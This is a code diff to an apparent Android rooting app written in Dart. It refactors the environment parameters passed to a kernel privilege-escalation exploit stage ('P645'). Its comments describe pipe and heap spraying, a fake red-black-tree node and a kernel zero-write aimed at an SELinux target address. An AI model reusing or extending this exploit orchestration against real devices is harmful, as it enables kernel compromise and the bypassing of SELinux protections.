@@ -12,6 +12,7 @@ import 'version.dart';
 
 import 'calib.dart';
 import 'shizuku.dart';
+import 'x645_env.dart';
 
 /// 参数集（对应 PRE_PIPES）
 ///   modern  = 新版，PRE_PIPES=512   —— 512KB 管道载体能建起来，落位约 80%
@@ -1433,17 +1434,19 @@ class RootChain extends ChangeNotifier {
       s.runs++;
       await ShizukuShell.run(_prepCmd());
       final logPath = '$workDir/s0_${_ts()}.log';
-      final env =
-          'P645_STAGE=1 P645_STAGE_FROM=0 P645_STAGE_TO=1 P645_STAGE_TRIES=4 P645_ATTEMPTS=1 '
-          'P645_KIDS=0 P645_CRED_FARM=0 P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 P645_FILL_SELF=0 '
-          'P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 P645_REPEATS=520 '
-          'P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 P645_V8=1 '
-          'P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
-          'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
-          'P645_THRESH=32 P645_RING_GO=0 P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} '
-          // PRE_PIPES 决定 uid 2000 的 64MB 管道预算用得早不早：
-          // 20000 会把预算占满 ⇒ 后面 PIPE512=64 的 512KB 管道必然 EPERM（实测 errno=1）。
-          'P645_PRE_PIPES=$prePipes P645_LOG=$logPath';
+      final env = x645StageEnv(
+        stageFrom: 0,
+        stageTo: 1,
+        tries: 4,
+        prePipes: prePipes,
+        logPath: logPath,
+        // P645_LEFT 与 P645_FORCE_LEFT 必须同时给：载荷构造 fake_node 时读的是
+        // P645_LEFT（符号 g_left_arg），g_force_left 要更晚才回填进同一个字段，
+        // 只给 FORCE_LEFT 时 fake_node.left 可能是 0，`mode=4` 就走 rb_left==0 的
+        // case1 分支 ⇒ 判据通过但内核零写入。细节与真机 A/B 见 CHANGELOG「未发布」。
+        extra: 'P645_LEFT=${calib.selinuxZeroTargetHex} '
+            'P645_FORCE_LEFT=${calib.selinuxZeroTargetHex} ',
+      );
       // 温度闸 + 环境探针
       await _cooldownGate();
       if (!await _ensureAwake()) {
@@ -1734,14 +1737,13 @@ class RootChain extends ChangeNotifier {
     final s = _byId[stage]!;
     s.runs++;
     final logPath = '$workDir/${stage.name}_${_ts()}.log';
-    var env =
-        'P645_STAGE=1 P645_STAGE_FROM=$stageFrom P645_STAGE_TO=2 P645_STAGE_TRIES=$tries '
-        'P645_ATTEMPTS=1 P645_KIDS=0 P645_CRED_FARM=0 P645_DRAIN_AFTER=0 P645_THREAD_FILL=0 '
-        'P645_FILL_SELF=0 P645_LEAK_FORK=0 P645_FORK_AFTER=0 P645_PRE_UM_MB=0 P645_TIMERS=54000 '
-        'P645_REPEATS=520 P645_NDEL=7 P645_DEL_RUN_MS=2500 P645_CONC=1 P645_ANON_MB=8 P645_FREEZE=1 '
-        'P645_V8=1 P645_DRAIN_WAIT_MS=25000 P645_PIPE512=64 P645_SOCKS=64 P645_SOCK_MB=8 P645_UHID=0 '
-        'P645_MODE=4 P645_ANON2_MB=1024 P645_PIPE_DRAIN=1 P645_PIPE_K=4 P645_SCAN_STOP=1 '
-        'P645_THRESH=32 P645_RING_GO=0 P645_PRE_PIPES=$prePipes P645_LOG=$logPath';
+    var env = x645StageEnv(
+      stageFrom: stageFrom,
+      stageTo: 2,
+      tries: tries,
+      prePipes: prePipes,
+      logPath: logPath,
+    );
     if (tryList != null && tryList.isNotEmpty) {
       env += " P645_TRY_LIST='$tryList'";
     }
